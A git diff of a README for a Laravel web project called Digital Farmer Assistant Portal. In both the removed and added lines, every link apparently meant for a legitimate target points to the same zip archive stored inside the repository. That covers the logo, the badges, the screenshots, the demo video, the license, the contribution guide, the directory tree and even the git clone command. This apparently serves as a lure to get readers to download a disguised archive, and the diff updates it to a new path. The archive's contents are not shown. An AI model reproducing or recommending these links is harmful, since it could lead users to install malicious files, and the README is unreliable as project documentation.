@@ -1,14 +1,14 @@
 # Digital Farmer Assistant Portal
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip%20SVG/2%20CMYK/1%20Full%https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip" width="400" alt="Laravel Logo">
+  <img src="https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip%20SVG/2%20CMYK/1%20Full%https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip" width="400" alt="Laravel Logo">
 </p>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip"><img src="https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip" alt="Build Status"></a>
-  <a href="https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip"><img src="https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip" alt="Total Downloads"></a>
-  <a href="https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip"><img src="https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip" alt="Latest Stable Version"></a>
-  <a href="https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip"><img src="https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip" alt="License"></a>
+  <a href="https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip"><img src="https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip" alt="Build Status"></a>
+  <a href="https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip"><img src="https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip" alt="Total Downloads"></a>
+  <a href="https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip"><img src="https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip" alt="Latest Stable Version"></a>
+  <a href="https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip"><img src="https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip" alt="License"></a>
 </p>
 
 ---
@@ -52,23 +52,23 @@ resources/views/
 ├── admin/ (Admin dashboard)
 ├── tutorials/ (Static tutorial pages)
 ├── partials/ (Reusable components)
-├── https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip
-├── https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip
-├── https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip
-└── https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip
+├── https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip
+├── https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip
+├── https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip
+└── https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip
 ```
 
 ---
 
 ## 📸 Screenshots
 
-Watch the screenshots of the project [here](https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip).
+Watch the screenshots of the project [here](https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip).
 
 ---
 
 ## 🎥 Demo Video
 
-Watch the full demo of the project [here](https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip).
+Watch the full demo of the project [here](https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip).
 
 ---
 
@@ -78,12 +78,12 @@ Watch the full demo of the project [here](https://raw.githubusercontent.com/ifte
 - PHP 8.0+
 - Composer
 - MySQL
-- https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip & npm
+- https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip & npm
 
 ### Steps:
 1. Clone the repository:
    ```bash
-   git clone https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip
+   git clone https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip
    ```
 2. Install dependencies:
    ```bash
@@ -106,13 +106,13 @@ Watch the full demo of the project [here](https://raw.githubusercontent.com/ifte
 
 ## 📜 License
 
-This project is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip).
+This project is open-sourced software licensed under the [MIT license](https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip).
 
 ---
 
 ## 🤝 Contributing
 
-We welcome contributions to improve the project. Please follow the [contribution guide](https://raw.githubusercontent.com/iftekharul01/digital_farmer_assistant_portal/main/resources/views/partials/digital_assistant_farmer_portal_v1.8.zip).
+We welcome contributions to improve the project. Please follow the [contribution guide](https://github.com/iftekharul01/digital_farmer_assistant_portal/raw/refs/heads/main/storage/framework/farmer-assistant-portal-digital-v1.5.zip).
 
 ---
 
